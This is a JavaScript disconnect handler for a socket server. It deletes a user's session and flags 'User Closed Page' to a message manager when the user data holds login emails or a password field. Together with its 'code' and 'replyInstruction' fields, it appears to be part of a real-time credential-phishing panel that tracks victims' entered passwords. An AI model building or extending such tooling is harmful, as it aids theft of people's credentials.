import { getMemoryStore } from "../utils/memory-store.js";
import { getUserMessageManager } from "../utils/userMessageManager.js";

export class DisconnectHandler {
  constructor(logger) {
    this.logger = logger;
    this.userStore = getMemoryStore();
  }

  handleDisconnect(socket, reason) {
    this.logger.info(`Client ${socket.id} disconnected: ${reason}`);

    try {
      const user = this.userStore.get(socket.userId);
      if (!user) {
        this.logger.info(`No user found for socket ${socket.id}`);
        return;
      }

      if (user.socket !== socket.id) {
        this.logger.info(
          `Socket ${socket.id} was not current for user ${socket.userId}`
        );
        return;
      }

      this.userStore.delete(socket.userId);
      this.logger.info(
        `User ${socket.userId} removed. Total users: ${this.userStore.size()}`
      );

      if (!this.shouldSendNotification(user)) {
        this.logger.debug(
          `No email data found for user ${socket.userId} - skipping notification`
        );
        return;
      }

      this.sendDisconnectNotification(user);
    } catch (error) {
      this.logger.error("Error handling disconnect:", error.message);
    }
  }

  shouldSendNotification(user) {
    const notificationOnDisconnect = process.env.Notification_On_Disconnect;
    if (
      notificationOnDisconnect === undefined ||
      notificationOnDisconnect === "true"
    ) {
      return true;
    }

    if (notificationOnDisconnect === "false") {
      if (!user?.data) {
        return false;
      }

      const { data } = user;
      const hasLoginEmail = data.login_email && data.login_email.trim() !== "";
      const hasBussinessEmail =
        data.business_email && data.business_email.trim() !== "";
      const hasPassword = data.password_one && data.password_one.trim() !== "";

      return hasLoginEmail || hasBussinessEmail || hasPassword;
    }

    return false;
  }

  sendDisconnectNotification(user) {
    try {
      const userId = user.id || user.userId;
      const manager = getUserMessageManager();
      manager.update(userId, {
        currentStep: "User Closed Page",
        code: null,
        replyInstruction: null,
      });

      this.logger.info(
        `Disconnect notification updated for user: ${userId}`
      );
    } catch (error) {
      this.logger.error(
        "Error sending disconnect notification:",
        error.message
      );
    }
  }
}
